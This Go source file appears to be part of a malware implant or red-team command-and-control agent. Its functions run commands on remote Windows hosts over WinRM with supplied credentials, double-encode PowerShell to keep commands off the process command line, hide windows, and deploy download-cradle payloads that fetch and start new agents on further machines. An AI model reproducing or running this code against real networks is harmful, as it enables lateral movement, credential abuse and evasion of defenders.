//go:build windows

package agent

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"unicode/utf16"
)

// utf16LEBase64 encodes s as a UTF-16LE byte sequence and returns its
// standard base64 representation, which PowerShell -EncodedCommand expects.
func utf16LEBase64(s string) string {
	runes := utf16.Encode([]rune(s))
	buf := make([]byte, len(runes)*2)
	for i, r := range runes {
		binary.LittleEndian.PutUint16(buf[i*2:], r)
	}
	return base64.StdEncoding.EncodeToString(buf)
}

// winrmExec executes cmd on a remote Windows host using PowerShell Invoke-Command
// over WinRM/PSRemoting. Credentials are passed via a PSCredential object and the
// command is base64-encoded to keep it off the process command line (OPSEC).
func winrmExec(target, user, pass, cmd string) (string, error) {
	// Build the PowerShell script that wraps Invoke-Command.
	// The inner command is itself encoded to avoid quoting hell.
	innerB64 := utf16LEBase64(cmd)
	script := fmt.Sprintf(`
$pw = ConvertTo-SecureString -String '%s' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('%s', $pw)
Invoke-Command -ComputerName '%s' -Credential $cred -ScriptBlock {
    powershell -NonInteractive -EncodedCommand %s
}
`, escapePS(pass), escapePS(user), escapePS(target), innerB64)

	encoded := utf16LEBase64(script)
	out, err := runShell(fmt.Sprintf(
		"powershell -NonInteractive -WindowStyle Hidden -EncodedCommand %s", encoded,
	))
	if err != nil {
		return out, fmt.Errorf("winrmExec %s: %w", target, err)
	}
	return out, nil
}

// winrmDeploy runs a PowerShell payload on a remote host via WinRM.
// payload is typically a download cradle that fetches and executes a new agent.
func winrmDeploy(target, user, pass, payload string) (string, error) {
	// Encode the payload so it survives quoting inside Invoke-Command.
	payloadB64 := utf16LEBase64(payload)
	script := fmt.Sprintf(`
$pw = ConvertTo-SecureString -String '%s' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('%s', $pw)
Invoke-Command -ComputerName '%s' -Credential $cred -AsJob -ScriptBlock {
    powershell -NonInteractive -WindowStyle Hidden -EncodedCommand %s
} | Out-Null
`, escapePS(pass), escapePS(user), escapePS(target), payloadB64)

	encoded := utf16LEBase64(script)
	out, err := runShell(fmt.Sprintf(
		"powershell -NonInteractive -WindowStyle Hidden -EncodedCommand %s", encoded,
	))
	if err != nil {
		return out, fmt.Errorf("winrmDeploy %s: %w", target, err)
	}
	return out, nil
}

// escapePS escapes a string for safe embedding inside a PowerShell single-quoted
// string literal by doubling any single-quote characters.
func escapePS(s string) string {
	out := make([]byte, 0, len(s)+4)
	for i := 0; i < len(s); i++ {
		if s[i] == '\'' {
			out = append(out, '\'', '\'')
		} else {
			out = append(out, s[i])
		}
	}
	return string(out)
}
